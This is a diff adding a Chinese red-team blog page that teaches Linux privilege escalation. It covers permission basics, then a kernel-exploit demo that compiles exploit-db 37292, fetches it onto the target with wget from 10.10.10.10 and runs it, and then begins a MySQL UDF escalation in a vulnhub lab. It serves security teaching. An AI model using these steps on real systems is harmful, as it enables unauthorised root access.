@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Linux 提权杂记0x1 前言  linux提权按类型划分可以归类为以下几种:  内核漏洞利用  root权限运行程序  组件服务  弱&#x2F;重复&#x2F;明文密码  配置错误  suid&#x2F;Guid配置错误  滥用sudo权限  root运行但普通用户可写的脚本  PATH提权  定时任务  nfs   在演示上述漏洞之前我们需要了解linux权限划分和什么是提权?   0x2 什么是提权？  权限提升是利">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 提权杂记">
+<meta property="og:url" content="http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/index.html">
+<meta property="og:site_name" content="ling">
+<meta property="og:description" content="Linux 提权杂记0x1 前言  linux提权按类型划分可以归类为以下几种:  内核漏洞利用  root权限运行程序  组件服务  弱&#x2F;重复&#x2F;明文密码  配置错误  suid&#x2F;Guid配置错误  滥用sudo权限  root运行但普通用户可写的脚本  PATH提权  定时任务  nfs   在演示上述漏洞之前我们需要了解linux权限划分和什么是提权?   0x2 什么是提权？  权限提升是利">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/VcQtBKpAJG8HOSy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/TaSJrVxepFtAkh7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/qMZiIKrzoCExhAt.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/dJtIUzun1EGb9vO.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/tjbMB3mhq68osnX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/NafYRKh95kJOrMW.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/RZBCp8q2yQxgVkH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/tyoWK8wEigeRDdm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/81V3aeEfyoLGCSn.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/i1wCODXjslkn6UP.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/CB6NzgVlKaxE2PY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/WMyeDfKQzlcZXO3.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/ynYRoMCi2gH83E9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/sOaDy6iR1zmPfG7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/wJkIKlBMnV5EQCT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/qfbatBdRrD29Ihm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/vSFD2zsPHRGhn3w.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/gIToamWPD1O2tzk.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/4kDY5rCV3jJvUfS.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/K6Jk8oucISbyxUZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/mvqSbKEjeupCF9n.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/6QTi2Jvre1DBxd7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/5eyX76wYNxIfcs9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/8RGnEHk6Ndc1MCr.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/wkQfjaJKBhOC2u4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/1wpAdbSD9VW8IF7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/HIo4kWSVXCOhLGa.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/mlhcBzrt6bo3aVY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/kRGCP1c59Uq6hx2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/TajsMNAb7zd8Cl3.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/GR6CTA9Dg7xEifL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/PyVbTw8sFjJXiBt.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/12/NrKS7inZzveCd3q.png">
+<meta property="article:published_time" content="2022-02-11T23:27:05.000Z">
+<meta property="article:modified_time" content="2022-02-11T23:43:29.919Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/12/VcQtBKpAJG8HOSy.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Linux 提权杂记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&text=Linux 提权杂记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&is_video=false&description=Linux 提权杂记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux 提权杂记&body=Check out this article: http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&name=Linux 提权杂记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&t=Linux 提权杂记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Linux 提权杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 什么是提权？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 Linux权限划分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8A%BD%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.权限抽象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 内核利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 root权限运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 组件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-%E5%BC%B1-%E9%87%8D%E5%A4%8D-%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">0x7 弱&#x2F;重复&#x2F;明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x8-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.8.</span> <span class="toc-text">0x8 配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x9-%E6%BB%A5%E7%94%A8sudo%E6%9D%83%E9%99%90"><span class="toc-number">1.9.</span> <span class="toc-text">0x9 滥用sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-suid-sgid-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 suid&#x2F;sgid 可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-root%E8%BF%90%E8%A1%8C%E4%BD%86%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 root运行但普通用户可写的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-PATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">0x13 定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-nfs"><span class="toc-number">1.14.</span> <span class="toc-text">0x14 nfs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.15.</span> <span class="toc-text">0x15 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LinPEAS"><span class="toc-number">1.15.1.</span> <span class="toc-text">1.LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LinEnum"><span class="toc-number">1.15.2.</span> <span class="toc-text">2.LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux-exploit-suggester"><span class="toc-number">1.15.3.</span> <span class="toc-text">3.linux-exploit-suggester</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%A8%80"><span class="toc-number">1.16.</span> <span class="toc-text">结言</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Linux 提权杂记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-11T23:27:05.000Z" itemprop="datePublished">2022-02-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E7%BA%A2%E9%98%9F/" rel="tag">红队</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Linux-提权杂记"><a href="#Linux-提权杂记" class="headerlink" title="Linux 提权杂记"></a>Linux 提权杂记</h1><h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>  linux提权按类型划分可以归类为以下几种:</p>
+<ul>
+<li><p>内核漏洞利用</p>
+</li>
+<li><p>root权限运行程序</p>
+</li>
+<li><p>组件服务</p>
+</li>
+<li><p>弱/重复/明文密码</p>
+</li>
+<li><p>配置错误</p>
+</li>
+<li><p>suid/Guid配置错误</p>
+</li>
+<li><p>滥用sudo权限</p>
+</li>
+<li><p>root运行但普通用户可写的脚本</p>
+</li>
+<li><p>PATH提权</p>
+</li>
+<li><p>定时任务</p>
+</li>
+<li><p>nfs</p>
+<p>  在演示上述漏洞之前我们需要了解<code>linux</code>权限划分和什么是提权?</p>
+</li>
+</ul>
+<h2 id="0x2-什么是提权？"><a href="#0x2-什么是提权？" class="headerlink" title="0x2 什么是提权？"></a>0x2 什么是提权？</h2><p>  权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得对通常不受应用程序或用户保护的资源的提升访问权限的行为。结果是，具有比应用程序开发人员或系统管理员预期更多权限的应用程序可以执行未经授权的操作。</p>
+<p>  系统上的<code>root</code>账号拥有对操作系统的完全管理级别访问权限，我们有时候渗透过程获取的<code>linux</code>账号可能是普通用户权限对操作系统的操作有限。因此我们需要想法设法把自身权限提高来进行其他操作。</p>
+<h2 id="0x3-Linux权限划分"><a href="#0x3-Linux权限划分" class="headerlink" title="0x3 Linux权限划分"></a>0x3 Linux权限划分</h2><h3 id="1-权限抽象"><a href="#1-权限抽象" class="headerlink" title="1.权限抽象"></a>1.权限抽象</h3><p>  一个完整的权限管理体系，要有合理的抽象。这里就包括对用户、进程、文件、内存、系统调用等抽象。</p>
+<p>  至于什么是抽象？我是这么理解，可以把抽象想象成一个根据类别分化的领域。</p>
+<p>  比如用户的抽象可以想象成用户的领域，这个领域里用户会根据类别或其他特征进行分化。同时用户的领域是可以在系统的领域里面。领域不只是单独存在还可以像套娃一样的存在。</p>
+<p>  <strong>现在，我们来说一下用户和组</strong>。<code>Linux</code>是一个<code>多用户平台</code>,允许多个用户同时登录系统工作。<code>Linux</code>将用户抽象成了账号，账号可以登录系统，比如通过<code>登录名+密码</code>的方式登录，或者通过<code>证书</code>的方式登录。</p>
+<p>  但是为了方便每个用户的权限，<code>Linux</code>还支持<strong>组(Group)账户</strong>。组账户时多个账户的集合，组可以为成员们分配某一类权限。每个用户可以在多个组，这样就可以利用组给用户快速分配权限。</p>
+<p>  组的概念有点像微信群。一个用户可以在多个群中，用户可以在<code>A</code>群获取<code>股票</code>的信息，同时又在<code>B</code>群获取<code>期货</code>的信息。这都不会冲。如果两个群的内容都相同时，也不会对用户造成任何的冲突。</p>
+<p>  每个<code>组管理员</code>可以理解为微信群群主，对自己群内的人员有一定的管理权限，<code>root</code>管理员可以理解为微信开发人员对微信有完全控制的权限。</p>
+<p>  此外，<code>Linux</code>还对文件进行了权限抽象(注意目录也是一种文件)。<code>Linux</code>中一个文件可以设置下面<code>3种</code>权限:</p>
+<ul>
+<li><p>1.读权限(<code>r:Read</code>)：控制读取文件</p>
+</li>
+<li><p>2.写权限(<code>w:Write</code>)：控制写入文件‘</p>
+</li>
+<li><p>3.执行权限(<code>x:Execute</code>)：控制将文件执行，比如脚本、应用程序</p>
+<p>  如果一个脚本能正常运行那么它一定会用<code>执行权限和读权限</code>。</p>
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/02/12/VcQtBKpAJG8HOSy.png" alt="image-20220210164027438"></p>
+<p>  然后每个文件又可以从<code>3个维度</code>去配置上诉的<code>3种权限</code>：</p>
+<ul>
+<li><p>1.<code>用户维度</code>。每个文件所属<code>1个用户</code>，用户维度配置的<code>rwx</code>在用户维度生效</p>
+</li>
+<li><p>2.<code>组维度</code>。每个文件可以所属<code>1个分组</code>，组维度配置的<code>rwx</code>在组维度生效</p>
+</li>
+<li><p>3.<code>全部用户维度</code>。设置对所有用户的权限</p>
+<p>  一个文件设置为组权限就代表它可以被<code>主组(初始组)</code>内的成员进行<code>rwx</code>操作，如果是<code>附加组</code>需要登录后切换<code>组</code>才能进行操作。</p>
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/02/12/TaSJrVxepFtAkh7.png" alt="image-20220210171259737"></p>
+<p>  图上有两个文件权限，分别是<code>drwxr-xr-x</code>和<code>-rw-r--r--</code></p>
+<p>  第<code>1</code>位：表示文档类型，取值常见的有:</p>
+<ul>
+<li><p><code>d 表示文件夹</code></p>
+</li>
+<li><p>``- 表示文件`</p>
+</li>
+<li><p><code>1 表示软连接</code></p>
+</li>
+<li><p><code>s 表示套接字</code></p>
+</li>
+<li><p><code>p 表示管道</code></p>
+<p>  第<code>2-4</code>位：按照顺序(位置顺序是不会变的)，分别代表：</p>
+</li>
+<li><p><code>读(r)权限</code></p>
+</li>
+<li><p><code>写(w)权限</code></p>
+</li>
+<li><p><code>执行(x)权限</code></p>
+</li>
+<li><p><code>- 代表无权限</code></p>
+<p>  第<code>5-7</code>位同理</p>
+<p>  第<code>8-10</code>位同理</p>
+<p>  权限分配种,均是<code>rwx</code>的三个参数组合，且位置顺序不会变化，没有相对应权限就用<code>-</code>代替</p>
+<p>  但是每个位置的权限代表不同领域，以顺序为例:</p>
+</li>
+<li><p><code>1</code> 代表文件类型</p>
+</li>
+<li><p><code>2-4</code> 代表文件拥有者权限</p>
+</li>
+<li><p><code>5-7</code> 代表同组用户的权限</p>
+</li>
+<li><p><code>8-10</code> 代表其他用户，即非同组、非文件所有者外的权限</p>
+<p>  我们有时候使用<code>chmod</code>赋予文件<code>777</code>权限，其实就是赋予<code>rwxrwxrwx</code>权限，至于为什么<code>rwx</code>会转成<code>7</code>？</p>
+<p>  <code>Linux</code>每个文件都包含控制权的<code>8</code>位数据。在二进制形式中,<code>000</code>代表不授予任何形式权限</p>
+<p>  当我们设置<code>r</code>权限时，它会向数据添加<code>4</code>位，使其成为<code>100(二进制格式)</code>，转成<code>十进制为4</code>。设置<code>w</code>权限时将在数据中添加<code>2</code>位，二进制为<code>010</code>，十进制为<code>2</code>。最后设置<code>x</code>权限时数据会添加<code>1</code>位，二进制为<code>001</code>，十进制为<code>1</code>。简而言之:</p>
+</li>
+<li><p><code>r</code>相当于<code>4</code></p>
+</li>
+<li><p><code>w</code>相当于<code>2</code></p>
+</li>
+<li><p><code>x</code>相当于<code>1</code></p>
+<p>  至于为什么<code>r</code>权限会是<code>4</code>呢，那就是要看<code>linux</code>权限排列</p>
+</li>
+<li><p><code>0：无权限</code></p>
+</li>
+<li><p><code>1：执行</code></p>
+</li>
+<li><p><code>2：写</code></p>
+</li>
+<li><p><code>3：写入和执行</code></p>
+</li>
+<li><p><code>4：阅读</code></p>
+</li>
+<li><p><code>5：读取和执行</code></p>
+</li>
+<li><p><code>6：读写</code></p>
+</li>
+<li><p><code>7：读、写和执行</code></p>
+</li>
+</ul>
+<p>  <strong>现在我们看到指令权限分化和passwd权限分化</strong></p>
+<p>  <code>id</code>指令</p>
+<p><img src="https://s2.loli.net/2022/02/12/qMZiIKrzoCExhAt.png" alt="image-20220210173722222"></p>
+<ul>
+<li><code>uid</code>是用户<code>id</code></li>
+<li><code>gid</code>是组<code>id</code></li>
+<li><code>groups</code> 后面是每个分组和分组的<code>id</code>，第一个组是<code>初始组</code>，后面是<code>附加组</code></li>
+</ul>
+<p>  <strong>/etc/passwd文件</strong></p>
+<p>  <code>/etc/passwd</code>这个文件存储了所有用户信息，如图所示</p>
+<p><img src="https://s2.loli.net/2022/02/12/dJtIUzun1EGb9vO.png" alt="image-20220210173948352"></p>
+<p>  现在我们需要了解每一个文件参数代表的意思，拿<code>root</code>举例</p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>root</code> 代表用户名</p>
+</li>
+<li><p><code>x</code> 代表密码</p>
+</li>
+<li><p><code>0</code> 代表<code>uid</code></p>
+</li>
+<li><p><code>0</code> 代表<code>gid</code></p>
+</li>
+<li><p><code>root</code> 代表<code>user id</code>信息</p>
+</li>
+<li><p><code>root</code> 代表<code>home</code>目录</p>
+</li>
+<li><p><code>/bin/bash</code> 代表 <code>shell</code>路径</p>
+<p>  现在了解了<code>什么是提权</code>和<code>权限分化</code>那么可以开始提权演示了。</p>
+</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/%E9%87%8D%E5%AD%A6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AE%8C/08%20%20%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E6%8C%87%E4%BB%A4%EF%BC%9A%20%E8%AF%B7%E7%AE%80%E8%BF%B0%20Linux%20%E6%9D%83%E9%99%90%E5%88%92%E5%88%86%E7%9A%84%E5%8E%9F%E5%88%99%EF%BC%9F.md">https://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/%E9%87%8D%E5%AD%A6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AE%8C/08%20%20%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E6%8C%87%E4%BB%A4%EF%BC%9A%20%E8%AF%B7%E7%AE%80%E8%BF%B0%20Linux%20%E6%9D%83%E9%99%90%E5%88%92%E5%88%86%E7%9A%84%E5%8E%9F%E5%88%99%EF%BC%9F.md</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/">https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/</a></p>
+<h2 id="0x04-内核利用"><a href="#0x04-内核利用" class="headerlink" title="0x04 内核利用"></a>0x04 内核利用</h2><p>  各种<code>Linux</code>内核版本都存在内核级漏洞利用。一个非常著名的例子就是<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io">Dirty COW</a> (CVE-2016-5195)，俗称<code>脏牛漏洞</code>。该漏洞利用内核中的漏洞以<code>root</code>权限执行代码。</p>
+<p>  有些内核漏洞只需要<code>下载</code>、<code>编译</code>、<code>运行</code>就可以完成一次攻击，甚是简单。但是有一些内核漏洞需要修改<code>payload</code>没那么简单，需要微调。但是总体来说<code>内核漏洞提权</code>是一个普遍存在的方式。</p>
+<p>  <strong>注意:利用内核漏洞有可能导致系统不稳定，因此在针对生产系统运行内核漏洞需要注意</strong></p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境环境:<code>ubuntu 14</code></strong></p>
+<p>  <code>在演示过程我使用内核漏洞时经常导致系统奔溃，所以在实际情况使用内核漏洞提权可称为下下策</code></p>
+<p>  <code>uname -a</code>查询内核信息</p>
+<p><img src="https://s2.loli.net/2022/02/12/tjbMB3mhq68osnX.png" alt="image-20220211003432412"></p>
+<p>  查询到内核信息后还可以查询<code>lsb-release</code>，这个<code>lsb-release</code>不是所有<code>Linux</code>都有的。</p>
+<p><img src="https://s2.loli.net/2022/02/12/NafYRKh95kJOrMW.png" alt="image-20220211003507019"></p>
+<p>  使用<code>Google</code>或<code>Exploit-db</code>查询版本内核相关漏洞</p>
+<p><img src="https://s2.loli.net/2022/02/12/RZBCp8q2yQxgVkH.png" alt="image-20220211003531805"></p>
+<p>  将<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292">exploits</a>下载下来，开始编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o 37292 37292.c</span><br></pre></td></tr></table></figure>
+
+<p>  将编译的<code>poc</code>上传到目标</p>
+<p>  然后赋予权限运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.10.10/37292</span><br><span class="line">chmod 777 ./37292</span><br><span class="line">./37292</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/tyoWK8wEigeRDdm.png" alt="image-20220211003737388"></p>
+<h2 id="0x05-root权限运行程序"><a href="#0x05-root权限运行程序" class="headerlink" title="0x05 root权限运行程序"></a>0x05 root权限运行程序</h2><p>  <code>root</code>权限运行程序这个故名思意就是以<code>root</code>权限运行程序，比如<code>mysql</code>、<code>Redis</code>等。我这里使用<code>mysql</code>作为演示，因为这个很经典。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境: <code>vulnhub-Raven</code></strong></p>
+<p>  使用<code>ps -aux | grep mysql</code>搜索<code>mysql</code>服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">michael@Raven:~$ ps -aux | grep mysql</span><br><span class="line"></span><br><span class="line">root        555  0.0  0.3   4340  1624 ?        S    06:50   0:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root        916  0.1 10.3 552212 50720 ?        Sl   06:50   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/<span class="built_in">log</span>/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</span><br><span class="line">michael    1113  0.0  0.3  12704  1792 pts/0    S+   06:53   0:00 grep mysql</span><br></pre></td></tr></table></figure>
+
+<p>  当前<code>mysql</code>是以<code>root</code>权限运行</p>
+<p>  使用<code>udf动态库</code>进行提权</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">1518.c</a></p>
+<p>  将<code>1518.c</code>编译成<code>1518.so</code></p>
